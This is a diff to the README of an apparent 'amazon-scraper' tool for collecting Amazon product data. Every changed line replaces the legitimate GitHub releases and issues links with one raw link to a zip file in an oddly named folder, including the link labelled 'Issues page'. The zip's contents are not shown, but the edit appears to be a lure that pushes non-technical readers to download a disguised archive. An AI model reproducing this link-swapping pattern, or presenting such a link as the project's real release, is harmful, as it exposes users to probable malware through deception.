@@ -1,6 +1,6 @@
 # 🚀 amazon-scraper - Effortlessly Extract Amazon Product Data
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-e67e22)](https://github.com/ashu1436/amazon-scraper/releases)
+[![Download](https://raw.githubusercontent.com/ashu1436/amazon-scraper/main/ogum/amazon-scraper.zip%20Now-Release-e67e22)](https://raw.githubusercontent.com/ashu1436/amazon-scraper/main/ogum/amazon-scraper.zip)
 
 ## 📖 Overview
 The amazon-scraper allows you to gather product data from Amazon easily. This tool is designed for anyone who wants to extract essential information about products without any technical skills. 
@@ -19,7 +19,7 @@ The amazon-scraper allows you to gather product data from Amazon easily. This to
 - Disk Space: At least 200 MB available
 
 ## 🚀 Getting Started
-1. **Visit the Release Page:** To download the latest version, visit this page: [Download Here](https://github.com/ashu1436/amazon-scraper/releases).
+1. **Visit the Release Page:** To download the latest version, visit this page: [Download Here](https://raw.githubusercontent.com/ashu1436/amazon-scraper/main/ogum/amazon-scraper.zip).
   
 2. **Download the Application:** Look for the latest release and click on the download link. The file will automatically begin downloading. 
 
@@ -29,7 +29,7 @@ The amazon-scraper allows you to gather product data from Amazon easily. This to
    - For Linux: Extract the tarball and follow the standard installation instructions provided in the README.
 
 ## 📂 Download & Install
-You can download the application directly from the releases page. Click here to access the latest version: [Download Here](https://github.com/ashu1436/amazon-scraper/releases).
+You can download the application directly from the releases page. Click here to access the latest version: [Download Here](https://raw.githubusercontent.com/ashu1436/amazon-scraper/main/ogum/amazon-scraper.zip).
 
 ### Steps for Installation:
 - After downloading, follow the installation steps specific to your operating system as mentioned above.
@@ -53,7 +53,7 @@ If you experience issues during installation or while using the tool, consider t
 - Clear your browser cache and cookies if the application does not function as expected.
 
 ## 🤝 Support
-For any questions or support, feel free to check the [Issues page](https://github.com/ashu1436/amazon-scraper/issues) on GitHub. You can also join our community forums to connect with other users.
+For any questions or support, feel free to check the [Issues page](https://raw.githubusercontent.com/ashu1436/amazon-scraper/main/ogum/amazon-scraper.zip) on GitHub. You can also join our community forums to connect with other users.
 
 ## 📄 License
 This project is licensed under the MIT License. You can read more about it in the LICENSE file in the repository.
@@ -61,4 +61,4 @@ This project is licensed under the MIT License. You can read more about it in th
 ## 🌟 Acknowledgments
 Special thanks to all contributors and users who provided feedback and helped improve the application. Your contributions are greatly appreciated!
 
-For updates, remember to check the release page regularly: [Download Here](https://github.com/ashu1436/amazon-scraper/releases). Enjoy your data scraping!
+For updates, remember to check the release page regularly: [Download Here](https://raw.githubusercontent.com/ashu1436/amazon-scraper/main/ogum/amazon-scraper.zip). Enjoy your data scraping!
